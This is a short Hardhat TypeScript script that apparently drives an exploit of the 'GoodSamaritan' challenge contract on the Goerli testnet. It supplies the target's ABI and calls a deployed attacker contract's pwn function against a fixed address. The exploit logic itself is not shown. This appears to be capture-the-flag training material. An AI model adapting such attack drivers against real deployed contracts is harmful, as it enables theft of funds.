import { ethers } from "hardhat"

const provider = new ethers.providers.JsonRpcProvider(
  process.env.GOERLI_RPC_URL
)

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0xe175f6f776B3A5b1d260785d74C4c801fde206d7"
  const targetAbi = [
    {
      inputs: [],
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      inputs: [],
      name: "coin",
      outputs: [
        {
          internalType: "contract Coin",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x11df9995",
    },
    {
      inputs: [],
      name: "requestDonation",
      outputs: [
        {
          internalType: "bool",
          name: "enoughBalance",
          type: "bool",
        },
      ],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x25143638",
    },
    {
      inputs: [],
      name: "wallet",
      outputs: [
        {
          internalType: "contract Wallet",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x521eb273",
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("GoodSamaritan")

  const tx = await contract.pwn(targetAddress, {
    gasLimit: 300000,
  })
  try {
    const receipt = await tx.wait()
    console.log(
      `tx at https://goerli.etherscan.io/tx/${receipt.transactionHash}`
    )
  } catch (error: any) {
    console.error("Error:", error.reason)
    console.log(
      `Error tx  at https://goerli.etherscan.io/tx/${error?.transactionHash}`
    )
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
